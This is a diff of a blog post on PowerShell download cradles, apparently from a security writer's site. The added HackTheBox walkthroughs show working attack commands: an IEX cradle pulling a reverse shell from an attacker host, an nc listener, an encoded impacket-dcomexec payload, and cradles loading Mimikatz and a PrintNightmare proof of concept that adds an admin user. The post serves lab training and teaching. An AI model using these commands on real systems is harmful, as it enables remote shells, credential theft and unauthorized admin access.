@@ -1,13 +1,21 @@
 +++
-tags = ["Windows", "Active Directory", "PowerShell", "Download Cradle"]
-draft = false
 title = "Understanding PowerShell Download Cradles: A Deep Dive"
+description = "A comprehensive guide to PowerShell download cradles, including secure implementation, real-world examples, and security considerations. Learn about essential cmdlets, advanced techniques, and best practices for memory-based code execution."
+draft = false
+tags = ["Windows", "Active Directory", "PowerShell", "DownloadCradle", "Download Cradle", "Security", "System Administration", "Windows Security", "PowerShell Scripting"]
+keywords = ["PowerShell download cradle", "memory execution PowerShell", "secure download cradle", "PowerShell WebClient", "PowerShell security", "Invoke-WebRequest", "PowerShell COM objects", "PowerShell scripting techniques"]
 author = "bloodstiller"
-date = 2024-11-11
+date = 2025-04-24
 toc = true
 bold = true
 next = true
+lastmod = 2025-04-24
 +++
+
+## Updates: 
+Article originally published on 11-11-2024 
+
+Updated with additional information on 24-04-2025 
 
 ## Introduction {#introduction}
 
@@ -32,6 +40,8 @@ A PowerShell download cradle is a technique that enables downloading and executi
 ### Basic Syntax Example using Invoke-Mimikatz: {#basic-syntax-example-using-invoke-mimikatz}
 
 -   **Load Script into memory**:
+    -
+
     -   {{< figure src="/ox-hugo/2024-11-12-103931_.png" >}}
 
 -   **Running Invoke-Mimikatz from memory**:
@@ -207,6 +217,7 @@ function Invoke-SecureDownloadCradle {
 #### Example usage without logging: {#example-usage-without-logging}
 
 ```powershell
+
 #Import Script
 . .\Invoke-SecureDownloadCradle.ps1
 
@@ -220,6 +231,7 @@ Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose
 #### Example usage with logging: {#example-usage-with-logging}
 
 ```powershell
+
 #Import Script
 . .\Invoke-SecureDownloadCradle.ps1
 
@@ -239,9 +251,58 @@ Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "SecureDow
     -   `-UserAgent "CompanyName/UpdateService"`
 
 
-## Real-World Examples Of Download-Cradle Use HackTheBox {#real-world-examples-of-download-cradle-use-hackthebox}
+## Real-World Examples Of Download-Cradle Use In HackTheBox: {#real-world-examples-of-download-cradle-use-in-hackthebox}
 
 -   I will often use download cradles on hack the box and here are some recent examples:
+
+
+### Jab: Using a download cradle via `impacket-dcomexec` to get a reverse shell: {#jab-using-a-download-cradle-via-impacket-dcomexec-to-get-a-reverse-shell}
+
+1.  Create the powershell cradle file:
+    ```shell
+    echo 'IEX (New-Object Net.Webclient).downloadstring("http://[ip]/rev.ps1")' >> cradle
+    ```
+
+    -   This will be used to grab the hosted shell from our system.
+
+2.  Encode the powershell cradle in correct UTF format so powershell can understand it.
+    ```shell
+    cat cradle | iconv -t UTF-16LE | base64 -w 0; echo
+    ```
+
+    -   {{< figure src="/ox-hugo/2025-04-24-084524_.png" >}}
+
+3.  Prepare our shell, I like to use [nishang](https://github.com/samratashok/nishang) however you can use <http://revshells.com> etc.
+    -   Copy our shell
+        ```shell
+           cp ~/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1
+        ```
+
+        -   {{< figure src="/ox-hugo/2025-04-24-084546_.png" >}}
+
+    -   Modify IP/Port in shell if required.
+        ```shell
+        vi rev.ps1
+        ```
+
+4.  Start our webserver:
+    ```shell
+    sudo python -m http.server 80
+    ```
+
+5.  Start our listener:
+    ```shell
+    rlwrap  -cAr nc -nvlp 53
+    ```
+
+6.  Paste the base64 encoded command into powershell/injection point
+    ```powershell
+    impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box 'powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAxAC8AcgBlAHYALgBwAHMAMQAiACkACgA='
+    ```
+
+    -   {{< figure src="/ox-hugo/2025-04-24-084616_.png" >}}
+
+7.  {{< figure src="/ox-hugo/2025-04-24-084032_.png" >}}
 
 
 ### Monteverde Box: Extracting the Administrator Password for Azure: {#monteverde-box-extracting-the-administrator-password-for-azure}
@@ -267,9 +328,9 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectP
 #### Setting Up the Environment {#setting-up-the-environment}
 
 1.  Start a Python HTTP server to host the Mimikatz script:
-```bash
-python3 -m http.server 9000
-```
+    ```bash
+       python3 -m http.server 9000
+    ```
 
 
 #### Loading Mimikatz into Memory {#loading-mimikatz-into-memory}
@@ -301,35 +362,37 @@ Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /doma
 
 -   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )
 
+-   **Start python server to host the script**:
+    ```bash
+       python3 -m http.server 9000
+    ```
 
-#### 1. Start python server to host the script:
+    -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
+    -   +Note+: I have this command aliased to `pws`
 
-```bash
-python3 -m http.server 9000
-```
-{{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
--   +Note+: I have this command aliased to `pws`
+-   **Use the download cradle to load the POC directly into memory**:
+    ```powershell
+      iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
+    ```
 
-#### 2. Use the download cradle to load the POC directly into memory:
-```powershell
-iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
-```
-{{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}
+    -   {{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}
 
-#### 3. Execute the script from memory to create new user &amp; add them to the admins:
-```powershell
-  Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
-```
-{{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}
+-   **Execute the script from memory to create new user &amp; add them to the admins**:
+    ```powershell
+      Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
+    ```
 
-#### 4. Verify the user has been added:
-```powershell
-net user bloodstiller
-```
-{{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
+    -   {{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}
+
+-   **Verify the user has been added**:
+    ```powershell
+      net user bloodstiller
+    ```
+
+    -   {{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
 
 
-## Security Considerations {#security-considerations}
+## Security Considerations: {#security-considerations}
 
 
 ### Detection Methods {#detection-methods}
